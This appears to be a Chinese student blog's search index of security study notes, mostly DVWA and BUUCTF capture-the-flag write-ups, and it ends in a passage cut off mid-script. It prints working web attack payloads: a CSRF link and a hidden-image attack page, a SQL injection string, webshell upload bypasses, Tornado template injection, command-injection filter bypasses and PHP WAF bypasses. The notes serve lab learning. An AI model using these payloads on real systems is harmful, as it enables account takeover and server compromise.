<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>docker</title>
    <url>/2021/04/25/docker/docker/</url>
    <content><![CDATA[<p><a href="https://blog.csdn.net/q610376681/article/details/90483576?ops_request_misc=%7B%22request_id%22:%22162380439616780269841164%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=162380439616780269841164&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-2-90483576.first_rank_v2_pc_rank_v29&utm_term=docker&spm=1018.2226.3001.4187">(24条消息) docker入门(利用docker部署web应用)_仰望星空-CSDN博客_docker部署web项目</a></p>
<p>这篇文章不错喔</p>
<p>2021.6.16成功在 kali2020 安装了docker</p>
<p>参考文章如下：</p>
<p><a href="https://www.cnblogs.com/lijingrong/p/13396884.html">kali 2020安装docker - pipiqiu - 博客园 (cnblogs.com)</a></p>
<p>其中一些命令：</p>
<p>查看doucker运行状态（以下显示已启动和未启动）</p>
<p><code>sudo systemctl status docker 或者 sudo service docker status</code></p>
<p> 开启和停止docker服务</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo systemctl start docker 或者sudo service docker start</span><br><span class="line">sudo systemctl stop docker 或者 sudo service docker stop</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>csrf</title>
    <url>/2021/02/22/dvwa/csrf/</url>
    <content><![CDATA[<p><strong>跨站请求伪造</strong>（英语：Cross-site request forgery）</p>
<p>感觉似曾相识，直到看到下面的话:</p>
<p>跟<a href="https://baike.baidu.com/item/%E8%B7%A8%E7%BD%91%E7%AB%99%E8%84%9A%E6%9C%AC/23316003">跨网站脚本</a>（XSS）相比，<strong>XSS</strong> 利用的是用户对指定网站的信任，CSRF 利用的是<a href="https://baike.baidu.com/item/%E7%BD%91%E7%AB%99/155722">网站</a>对用户<a href="https://baike.baidu.com/item/%E7%BD%91%E9%A1%B5%E6%B5%8F%E8%A7%88%E5%99%A8/8309940">网页浏览器</a>的信任。</p>
<p>跨站请求攻击，简单地说，是攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己曾经认证过的网站并运行一些操作（如发邮件，发消息，甚至财产操作如转账和购买商品）。由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去运行。这利用了web中用户身份验证的一个漏洞：<strong>简单的身份验证只能保证请求发自某个用户的浏览器，却不能保证请求本身是用户自愿发出的</strong>。</p>
<p>啊，这样与以前在电脑和手机上看见那些不怀好意的链接（别问我怎么看出来的），就是诱导单纯的人去点，原来有这么高大上的名字，有点小尴尬，之前我都按木马来理解……</p>
<p>对于dvwa的csrf这关，我查阅了几篇博客。</p>
<h2 id="Low"><a href="#Low" class="headerlink" title="**Low*\***"></a><strong><em>*</em>*Low*\</strong>***</h2><p>服务器端核心代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if( isset( $_GET[ &#39;Change&#39; ] ) ) &#123; </span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Get input </span><br><span class="line"></span><br><span class="line">    $pass_new  &#x3D; $_GET[ &#39;password_new&#39; ]; </span><br><span class="line"></span><br><span class="line">    $pass_conf &#x3D; $_GET[ &#39;password_conf&#39; ]; </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">    &#x2F;&#x2F; Do the passwords match? </span><br><span class="line"></span><br><span class="line">    if( $pass_new &#x3D;&#x3D; $pass_conf ) &#123; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; They do! </span><br><span class="line"></span><br><span class="line">        $pass_new &#x3D; mysql_real_escape_string( $pass_new ); </span><br><span class="line">        $pass_new &#x3D; md5( $pass_new ); </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Update the database </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        $insert &#x3D; &quot;UPDATE &#96;users&#96; SET password &#x3D; &#39;$pass_new&#39; WHERE user &#x3D; &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        $result &#x3D; mysql_query( $insert ) or die( &#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;&#x2F;pre&gt;&#39; ); </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">         &#x2F;&#x2F; Feedback for the user </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        echo &quot;&lt;pre&gt;Password Changed.&lt;&#x2F;pre&gt;&quot;; </span><br><span class="line"></span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    else &#123; </span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Issue with passwords matching </span><br><span class="line"></span><br><span class="line">        echo &quot;&lt;pre&gt;Passwords did not match.&lt;&#x2F;pre&gt;&quot;; </span><br><span class="line"></span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    mysql_close(); </span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p> 可以看到，服务器收到修改密码的请求后，会检查参数password_new与password_conf是否相同，如果相同，就会修改密码，并没有任何的防CSRF机制（当然服务器对请求的发送者是做了身份验证的，是检查的cookie，只是这里的代码没有体现= =）。</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="**漏洞利用*\***"></a><strong><em>*</em>*漏洞利用*\</strong>***</h2><p>1、构造链接</p>
<p>A) 最基础的:</p>
<p><a href="http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=123&amp;password_conf=123&amp;Change=Change#">http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=123&amp;password_conf=123&amp;Change=Change#</a></p>
<p>当受害者点击了这个链接，他的密码就会被改成123（这种攻击显得有些拙劣，链接一眼就能看出来是改密码的，而且受害者点了链接之后看到这个页面就会知道自己的密码被篡改了）</p>
<p><a href="http://image.3001.net/images/20161031/14778953244372.png"><img src="http://image.3001.net/images/20161031/14778953244372.png!small" alt="1.png"></a> </p>
<p>需要注意的是，CSRF最关键的是利用受害者的cookie向服务器发送伪造请求，所以如果受害者之前用Chrome浏览器登录的这个系统，而用搜狗浏览器点击这个链接，攻击是不会触发的，因为搜狗浏览器并不能利用Chrome浏览器的cookie，所以会自动跳转到登录界面。</p>
<p><a href="http://image.3001.net/images/20161031/14778953704168.png"><img src="http://image.3001.net/images/20161031/14778953704168.png!small" alt="1.png"></a></p>
<p>有人会说，这个链接也太明显了吧，不会有人点的，没错，所以真正攻击场景下，我们需要对链接做一些处理。</p>
<p>B) 我们可以使用短链接来隐藏URL（点击短链接，会自动跳转到真实网站）：</p>
<p>如<a href="http://dwz.cn/">http://dwz.cn/</a>****</p>
<p><a href="http://image.3001.net/images/20161031/14778954786668.png"><img src="http://image.3001.net/images/20161031/14778954786668.png!small" alt="1.png"></a></p>
<p>因为本地搭的环境，服务器域名是ip所以无法生成相应的短链接= =，实际攻击场景下只要目标服务器的域名不是ip，是可以生成相应短链接的。</p>
<p><a href="http://image.3001.net/images/20161031/14778955097586.png"><img src="http://image.3001.net/images/20161031/14778955097586.png!small" alt="1.png"></a> </p>
<p>需要提醒的是，虽然利用了短链接隐藏url，但受害者最终还是会看到密码修改成功的页面，所以这种攻击方法也并不高明。</p>
<p>C) 构造攻击页面</p>
<p>现实攻击场景下，这种方法需要事先在公网上传一个攻击页面，诱骗受害者去访问，真正能够在受害者不知情的情况下完成CSRF攻击。这里为了方便演示（才不是我租不起服务器= =），就在本地写一个test.html，下面是具体代码。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;img src&#x3D;&quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;dvwa&#x2F;vulnerabilities&#x2F;csrf&#x2F;?password_new&#x3D;hack&amp;password_conf&#x3D;hack&amp;Change&#x3D;Change#&quot; border&#x3D;&quot;0&quot; style&#x3D;&quot;display:none;&quot;&#x2F;&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;h1&gt;404&lt;h1&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;h2&gt;file not found.&lt;h2&gt;</span><br></pre></td></tr></table></figure>



<p>当受害者访问test.html时，会误认为是自己点击的是一个失效的url，但实际上已经遭受了CSRF攻击，密码已经被修改为了hack。</p>
<p><a href="http://image.3001.net/images/20161031/14778955408376.png"><img src="http://image.3001.net/images/20161031/14778955408376.png!small" alt="1.png"></a> </p>
]]></content>
      <tags>
        <tag>dvwa</tag>
      </tags>
  </entry>
  <entry>
    <title>1-5</title>
    <url>/2021/02/18/dvwa/1-5/</url>
    <content><![CDATA[<p>推荐文章：<a href="https://www.freebuf.com/articles/web/119467.html">https://www.freebuf.com/articles/web/119467.html</a></p>
<h4 id="brute-force："><a href="#brute-force：" class="headerlink" title="brute force："></a>brute force：</h4><p> 1.如题暴力破解，采用burp suite字典进行猜测用户名和密码</p>
<p> 2.使用“万能密码”：admin’ or’1’=’1</p>
<h4 id="file-upload："><a href="#file-upload：" class="headerlink" title="file upload："></a>file upload：</h4><p>（这里直接去做一做uploads靶场会更有收获）</p>
<p>看代码安全程度低，对于上传数据没有进行过滤，</p>
<p>所以直接上传一句话木马，php文件进行连接。</p>
<p>file upload1：1.抓包，修改数据：1.jpg更改为1.php上传，成功。</p>
<p>../../hackable/uploads/1.php succesfully uploaded!</p>
<p>​                2.采用%00截断的方法可以轻松绕过文件名的检查</p>
<p>%00在url语言里代表空格“ ”，因此它起到的作用就是截断文件的后半段，让它识别到的文件格式是.jpg，而解析时会是前面的脚本格式,比如改包时1.php.jpg</p>
<p>Sql:使用sqlmap跑的时候，因为自己的安装问题，执行命令必须以sqlmap.py -u的格式</p>
<h4 id="csrf"><a href="#csrf" class="headerlink" title="csrf"></a>csrf</h4><p>暂时不太理解，所以另外去摘抄了其他博主内容作为文章。</p>
<h4 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h4><p>其实和之前在sql靶场学习的差不多，思路基本上是：</p>
<p>爆字–爆段–报表–爆内容</p>
<p>对于难度的区别的话，无非low等级可以直接输入句子查询，而medium等级之后完全可以抓包来实现语句查询（篡改）</p>
<p><img src="/2021/02/18/dvwa/1-5/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(44).png"></p>
<p><img src="/2021/02/18/dvwa/1-5/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(45).png"></p>
<p><img src="/2021/02/18/dvwa/1-5/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(46).png"></p>
<p><img src="/2021/02/18/dvwa/1-5/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(49).png"></p>
]]></content>
      <tags>
        <tag>dvwa</tag>
      </tags>
  </entry>
  <entry>
    <title>mutiple</title>
    <url>/2021/05/12/buu/0/</url>
    <content><![CDATA[<h2 id="Linux-Labs"><a href="#Linux-Labs" class="headerlink" title="Linux Labs"></a>Linux Labs</h2><p><img src="/2021/05/12/buu/0/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(144).png"></p>
<p>打开靶机后提示连接</p>
<p>指令格式 ssh -p port</p>
<p>根据题目提示，输入 ssh -p  27891 <a href="mailto:&#x72;&#111;&#111;&#x74;&#64;&#110;&#111;&#x64;&#101;&#51;&#46;&#x62;&#117;&#117;&#x6f;&#x6a;&#x2e;&#x63;&#x6e;">&#x72;&#111;&#111;&#x74;&#64;&#110;&#111;&#x64;&#101;&#51;&#46;&#x62;&#117;&#117;&#x6f;&#x6a;&#x2e;&#x63;&#x6e;</a></p>
<p>密码：123456</p>
<h2 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h2><p>打开容器页面后</p>
<p>出现三份.txt</p>
<p><a href="http://bd69b4c9-dcb8-4ff9-b3cc-25daaf4346d5.node3.buuoj.cn/file?filename=/flag.txt&filehash=a9c5250a1a124c1b907c4d6a178a6341">/flag.txt</a><br><a href="http://bd69b4c9-dcb8-4ff9-b3cc-25daaf4346d5.node3.buuoj.cn/file?filename=/welcome.txt&filehash=62d96003865b8d60293618c385b943cb">/welcome.txt</a><br><a href="http://bd69b4c9-dcb8-4ff9-b3cc-25daaf4346d5.node3.buuoj.cn/file?filename=/hints.txt&filehash=f8da6a5eb4dc6a43b5f16b2170c5d2b5">/hints.txt</a></p>
<p>其中，flag.txt信息为：</p>
<p>flag in /fllllllllllllag，告诉了我们flag在文件fllllllllllllag里；</p>
<p>welcome.txt信息为：</p>
<p>render，看了writeup，知道了这里是提示我们render函数的模板注入</p>
<p>找到原理：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tornado render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页，如果用户对render内容可控，不仅可以注入XSS代码，而且还可以通过&#123;&#123;&#125;&#125;进行传递变量和执行简单的表达式。</span><br></pre></td></tr></table></figure>

<p>文章：<a href="https://blog.csdn.net/weixin_34942265/article/details/113671944">(3条消息) python模板注入_python SSTI tornado render模板注入_neo anderson的博客-CSDN博客</a></p>
<p>hint.txt信息为：</p>
<p>/hints.txt<br>md5(cookie_secret+md5(filename))，，给我们了一个计算公式</p>
<p>注意此时url路径<img src="/2021/05/12/buu/0/image-20210513194955869.png" alt="image-20210513194955869"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;hints.txt&amp;filehash&#x3D;f8da6a5eb4dc6a43b5f16b2170c5d2b5](http:&#x2F;&#x2F;bd69b4c9-dcb8-4ff9-b3cc-25daaf4346d5.node3.buuoj.cn&#x2F;file?filename&#x3D;&#x2F;hints.txt&amp;filehash&#x3D;f8da6a5eb4dc6a43b5f16b2170c5d2b5)</span><br></pre></td></tr></table></figure>

<p>可以看到后面有明显的hash值提示，猜测文件访问路径格式就是这样。</p>
<p>怀疑这个filehash就是通过这个公式算出来的，结合flag.txt中的提示，再次合理怀疑我们通过文件名（/fllllllllllllag）并按照这个公式计算出对应正确的filehash，并且按照这种格式访问url，就可以得到flag。</p>
<p>现在，我们文件名知道，md5函数可以调用，但是缺少了cookie_secret</p>
<p>这时候回到之前的render模板注入</p>
<p>来到flag.txt页面，修改路径</p>
<p><img src="/2021/05/12/buu/0/image-20210513195413293.png" alt="image-20210513195413293"></p>
<p>出现了error</p>
<p>上方?msg=error,这里我们可以修改参数值看看有什么变化</p>
<p><img src="/2021/05/12/buu/0/image-20210513195530008.png" alt="image-20210513195530008"></p>
<p>至此，我们可以从这里切入，将此作为注入点。</p>
<p><img src="/2021/05/12/buu/0/image-20210513195745573.png" alt="image-20210513195745573"></p>
<p>通过模板注入，得到了环境变量，内含有cookie_secret：750fc3c7-cfc4-4f0b-9000-76f4ed4c08eb（动态）</p>
<p>查到了一个大佬的博客写的python脚本：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line">def md5value(s):</span><br><span class="line">    md5 &#x3D; hashlib.md5() </span><br><span class="line">    md5.update(s) </span><br><span class="line">    return md5.hexdigest()</span><br><span class="line"></span><br><span class="line">def jiami(): </span><br><span class="line">    filename &#x3D; &#39;&#x2F;fllllllllllllag&#39;</span><br><span class="line">    cookie_s &#x3D;&quot;750fc3c7-cfc4-4f0b-9000-76f4ed4c08eb&quot;</span><br><span class="line">    print(md5value(filename.encode(&#39;utf-8&#39;)))</span><br><span class="line">    x&#x3D;md5value(filename.encode(&#39;utf-8&#39;))</span><br><span class="line">    y&#x3D;cookie_s+x</span><br><span class="line">    print(md5value(y.encode(&#39;utf-8&#39;)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">jiami()</span><br></pre></td></tr></table></figure>

<p>得到</p>
<p>哈希值：550e8b57a2f7c087a5792aa9be8a7461</p>
<p>接着构造payload：</p>
<p><a href="http://bd69b4c9-dcb8-4ff9-b3cc-25daaf4346d5.node3.buuoj.cn/file?filename=/fllllllllllllag&filehash=550e8b57a2f7c087a5792aa9be8a7461">bd69b4c9-dcb8-4ff9-b3cc-25daaf4346d5.node3.buuoj.cn/file?filename=/fllllllllllllag&amp;filehash=550e8b57a2f7c087a5792aa9be8a7461</a></p>
<p><img src="/2021/05/12/buu/0/image-20210513200252696.png" alt="image-20210513200252696"></p>
<h2 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h2><p><img src="/2021/05/12/buu/0/image-20210513230333771.png" alt="image-20210513230333771"></p>
<p>打开靶机后如图</p>
<p>传参?ip=127.0.0.1</p>
<p><img src="/2021/05/12/buu/0/image-20210513230557224.png" alt="image-20210513230557224"></p>
<p>结果不是与之前做的一样简单，有了对指令的过滤（被嘲讽了）</p>
<p><img src="/2021/05/12/buu/0/image-20210513230623071.png" alt="image-20210513230623071"></p>
<p>猜测应该是被过滤了，因为尝试了之前的| 、||等都不行</p>
<p>查了博客，相关资料</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">判断目标网站是对空格进行了过滤，我们可以使用一些方法代替空格来起到分割作用</span><br><span class="line"></span><br><span class="line">注：%20(space)、%09(tab)、$IFS$9、$&#123;IFS&#125;$9、 &#123;IFS&#125;、IFS 都可以</span><br><span class="line"></span><br><span class="line">但这里存在一些过滤&#123;IPS&#125;失效，多次尝试$IFS$9可以 （具体可以查看index.php文件中的过滤规则）</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>构造了?ip=127.0.0.1;cat$IFS$1flag.php</p>
<p>还是。。。</p>
<p><img src="/2021/05/12/buu/0/image-20210513231027253.png" alt="image-20210513231027253"></p>
<p>好吧，貌似flag也被过滤了</p>
<p>那么我们先看下还有index.php</p>
<p><img src="/2021/05/12/buu/0/image-20210513231122334.png" alt="image-20210513231122334"></p>
<p>得到了源代码，果然一大堆正则匹配，过滤了许多查询指令和flag字样。</p>
<p>所以我们得想办法绕过</p>
<p>这里我用了大佬博客的一种方法，拼接法</p>
<p><img src="/2021/05/12/buu/0/image-20210513231549694.png" alt="image-20210513231549694"></p>
<p><img src="/2021/05/12/buu/0/image-20210513231603829.png" alt="image-20210513231603829"></p>
<p>参照博客：<a href="https://blog.csdn.net/xiayu729100940/article/details/105048826">https://blog.csdn.net/xiayu729100940/article/details/105048826</a></p>
<h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><p>打开后尝试了多次计算器应该只有简单计算功能</p>
<p>不是什么sql注入，所以查看源码</p>
<p><img src="/2021/05/12/buu/0/image-20210517163046028.png" alt="image-20210517163046028"></p>
<p>得到提示  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">url:&quot;calc.php?num&#x3D;&quot;+encodeURIComponent($(&quot;#content&quot;).val()),</span><br></pre></td></tr></table></figure>

<p>hackbar走起</p>
<p><img src="/2021/05/12/buu/0/image-20210517163339301.png" alt="image-20210517163339301"></p>
<p>发现源代码，有存在过滤</p>
<p><img src="/2021/05/12/buu/0/image-20210517163514707.png" alt="image-20210517163514707"></p>
<p>对数字不感冒，但是一增加字母就无法访问，所以需要绕过</p>
<p>查了wp[BUUCTF | <a href="https://www.cnblogs.com/chrysanthemum/p/11757363.html">RoarCTF 2019]Easy Calc - !ao!ao - 博客园 (cnblogs.com)</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!--$(&quot;#content&quot;).val() 是什么意思：--&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--获取id为content的HTML标签元素的值,是JQuery,   (&quot;#content&quot;)相当于document.getElementById(&quot;content&quot;);(&quot;#content&quot;)相当于document.getElementById(&quot;content&quot;);(&quot;#content&quot;).val()相当于 document.getElementById(&quot;content&quot;).value;--&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--但是无论怎么注入都是400,403和500，这里用的是一个新的点：PHP的字符串解析特性--&gt;</span><br></pre></td></tr></table></figure>



<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">? num&#x3D;1;var_dump(scandir(chr(47))) </span><br></pre></td></tr></table></figure>

<p>这里先进行查询，注意这边num前加空格，不然会报错</p>
<p>大佬的理解：[(3条消息) <a href="https://blog.csdn.net/weixin_44077544/article/details/102630714">RoarCTF 2019]Easy Calc_沐目的博客-CSDN博客</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!--假如waf不允许num变量传递字母：--&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--http:&#x2F;&#x2F;www.xxx.com&#x2F;index.php?num &#x3D; aaaa   &#x2F;&#x2F;显示非法输入的话--&gt;</span><br><span class="line">&lt;!--1--&gt;</span><br><span class="line">&lt;!--那么我们可以在num前加个空格：--&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--http:&#x2F;&#x2F;www.xxx.com&#x2F;index.php? num &#x3D; aaaa--&gt;</span><br><span class="line">&lt;!--1--&gt;</span><br><span class="line">&lt;!--这样waf就找不到num这个变量了，因为现在的变量叫“ num”，而不是“num”。但php在解析的时候，会先把空格给去掉，这样我们的代码还能正常运行，还上传了非法字符。--&gt;</span><br></pre></td></tr></table></figure>

<p>成功查询<img src="/2021/05/12/buu/0/image-20210517164118854.png" alt="image-20210517164118854"></p>
<p>接下来就是构造payload了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">calc.php? num&#x3D;1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</span><br></pre></td></tr></table></figure>

<p>这个还不太理解，不过应该是调用函数再ASCII码</p>
<p>得到flag</p>
<p><img src="/2021/05/12/buu/0/image-20210517164258180.png" alt="image-20210517164258180"></p>
<h2 id="Upload"><a href="#Upload" class="headerlink" title="Upload"></a>Upload</h2><p>两题payload差不多，都是用phtml文件饶过，成功上传一句话木马后</p>
<p>蚁剑连接</p>
<p>最后 虚拟终端：cat \flag</p>
<p><img src="/2021/05/12/buu/0/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(275).png"></p>
<p><img src="/2021/05/12/buu/0/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(274).png"></p>
<h2 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h2><p>打开后代码如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> &lt;?php  </span><br><span class="line"> $text &#x3D; $_GET[&quot;text&quot;]; </span><br><span class="line"> $file &#x3D; $_GET[&quot;file&quot;]; </span><br><span class="line"> $password &#x3D; $_GET[&quot;password&quot;]; </span><br><span class="line">  if(isset($text)&amp;&amp;(file_get_contents($text,&#39;r&#39;)&#x3D;&#x3D;&#x3D;&quot;welcome to the zjctf&quot;))&#123;  </span><br><span class="line">  echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#39;r&#39;).&quot;&lt;&#x2F;h1&gt;&lt;&#x2F;br&gt;&quot;;                  	     if(preg_match(&quot;&#x2F;flag&#x2F;&quot;,$file))&#123;     </span><br><span class="line">  echo &quot;Not now!&quot;;    </span><br><span class="line">  exit();   &#125;</span><br><span class="line">  else&#123;     include($file); &#x2F;&#x2F;useless.php    </span><br><span class="line"> 		   $password &#x3D; unserialize($password);     </span><br><span class="line"> 		   echo $password;   </span><br><span class="line"> 		   &#125; </span><br><span class="line"> &#125; </span><br><span class="line">else&#123;</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">&#125; </span><br><span class="line">  ?&gt; </span><br></pre></td></tr></table></figure>

<p>补充知识：</p>
<p>1.PHP file_get_contents() 函数</p>
<p>把整个文件读入一个字符串中。</p>
<h6 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h6><?php
 echo file_get_contents("test.txt");
 ?><p> </p>
<p>上面的代码将输出：</p>
<p>This is a test file with test text.</p>
<p>2.unserialize</p>
<p>反序列化，</p>
<p><em>unserialize</em>是对单一的已序列化的变量进行操作，将其转换回 PHP 的值。</p>
<p><a href="https://blog.csdn.net/tree_ifconfig/article/details/82766587">https://blog.csdn.net/tree_ifconfig/article/details/82766587</a>  关于序列化和反序列化</p>
<p>3.php://filter用于读取源码 </p>
<p>   php://input用于执行php代码</p>
<p>4.data伪协议写入文件</p>
<p><img src="/2021/05/12/buu/0/1.png" alt="image-20210723204757276"></p>
<p><img src="/2021/05/12/buu/0/image-20210723204953368.png" alt="image-20210723204953368"></p>
<h2 id="HardSQL"><a href="#HardSQL" class="headerlink" title="HardSQL"></a>HardSQL</h2><p>这题sql与之前不同</p>
<p>万能密码、联合查询注入、双写等都被过滤，留下作者的恶趣味：你可别被我逮住了，臭弟弟</p>
<p><img src="/2021/05/12/buu/0/image-20210719112655637.png" alt="image-20210719112655637"></p>
<p>查了一下wp，了解到需要用报错注入。</p>
<h6 id="报错注入相关知识："><a href="#报错注入相关知识：" class="headerlink" title="报错注入相关知识："></a>报错注入相关知识：</h6><p>报错注入就是利用了数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中。</p>
<p>这里主要记录一下**<code>xpath语法错误</code>和<code>concat+rand()+group_by()导致主键重复</code>**</p>
<h2 id="羊城杯-2020-EasySer"><a href="#羊城杯-2020-EasySer" class="headerlink" title="[羊城杯 2020]EasySer"></a>[羊城杯 2020]EasySer</h2><p><img src="/2021/05/12/buu/0/image-20210811194952750.png" alt="image-20210811194952750"></p>
<p>开机页面后</p>
<p>按照wp提示查看了robots.txt协议</p>
<p><img src="/2021/05/12/buu/0/image-20210811195123019.png" alt="image-20210811195123019"></p>
<p>提示访问star1.php</p>
<p>进入页面，并且顺手查看源码</p>
<p><img src="/2021/05/12/buu/0/image-20210811195236481.png" alt="image-20210811195236481"></p>
<p><img src="/2021/05/12/buu/0/image-20210811195250701.png" alt="image-20210811195250701"></p>
<p>页面上一句话提示我们用不安全协议绕过。</p>
<p>然后是师傅找到的http协议成为突破口</p>
<p><img src="/2021/05/12/buu/0/1" alt="在这里插入图片描述"></p>
<p>其特点使它比https来说不安全</p>
<p>对于通信方不会过多确认</p>
<p>以127.0.0.1的身份访问</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;star1.php</span><br></pre></td></tr></table></figure>

<p><img src="/2021/05/12/buu/0/image-20210811200022893.png" alt="image-20210811200022893"></p>
<p>得到源码</p>
<p>Arjun工具</p>
<p>第一次无语，蚁剑连接上之后本来虚拟终端直接cat /flag，结果不行</p>
<p>我就直接去找flag.php，结果flag被人删了？？？直接做这题wp心情没有了。</p>
]]></content>
      <tags>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>强网杯 2019高明的黑客</title>
    <url>/2021/07/26/buu/1/</url>
    <content><![CDATA[<p><img src="/2021/07/26/buu/1/image-20210726102939511.png" alt="image-20210726102939511"></p>
<p>打开靶机后，网页提示下载源码：<a href="http://www.tar.gz/">www.tar.gz</a> </p>
<p>猜测里面包含可以利用的漏洞文件。</p>
<p>然后开始了漫长的下载。。。</p>
<p>下载完成后，我们发现里面包含的文件挺多的，而且是很多都为木马文件，所以排除了用360侦测出目标文件。</p>
<p>查看某些文件发现可以利用GET和POST传参利用。</p>
<p>找到大佬写的脚本，用python来跑就不用一个个试了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import os</span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">import threading</span><br><span class="line">import time</span><br><span class="line">print(&#39;开始时间：  &#39;+  time.asctime( time.localtime(time.time()) ))</span><br><span class="line">s1&#x3D;threading.Semaphore(100)  							  			#这儿设置最大的线程数</span><br><span class="line">filePath &#x3D; r&quot;D:&#x2F;soft&#x2F;phpstudy&#x2F;PHPTutorial&#x2F;WWW&#x2F;src&#x2F;&quot;</span><br><span class="line">os.chdir(filePath)													#改变当前的路径</span><br><span class="line">requests.adapters.DEFAULT_RETRIES &#x3D; 5								#设置重连次数，防止线程数过高，断开连接</span><br><span class="line">files &#x3D; os.listdir(filePath)</span><br><span class="line">session &#x3D; requests.Session()</span><br><span class="line">session.keep_alive &#x3D; False											 # 设置连接活跃状态为False</span><br><span class="line">def get_content(file):</span><br><span class="line">    s1.acquire()												</span><br><span class="line">    print(&#39;trying   &#39;+file+ &#39;     &#39;+ time.asctime( time.localtime(time.time()) ))</span><br><span class="line">    with open(file,encoding&#x3D;&#39;utf-8&#39;) as f:							#打开php文件，提取所有的$_GET和$_POST的参数</span><br><span class="line">            gets &#x3D; list(re.findall(&#39;\$_GET\[\&#39;(.*?)\&#39;\]&#39;, f.read()))</span><br><span class="line">            posts &#x3D; list(re.findall(&#39;\$_POST\[\&#39;(.*?)\&#39;\]&#39;, f.read()))</span><br><span class="line">    data &#x3D; &#123;&#125;														#所有的$_POST</span><br><span class="line">    params &#x3D; &#123;&#125;														#所有的$_GET</span><br><span class="line">    for m in gets:</span><br><span class="line">        params[m] &#x3D; &quot;echo &#39;xxxxxx&#39;;&quot;</span><br><span class="line">    for n in posts:</span><br><span class="line">        data[n] &#x3D; &quot;echo &#39;xxxxxx&#39;;&quot;</span><br><span class="line">    url &#x3D; &#39;http:&#x2F;&#x2F;127.0.0.1&#x2F;src&#x2F;&#39;+file</span><br><span class="line">    req 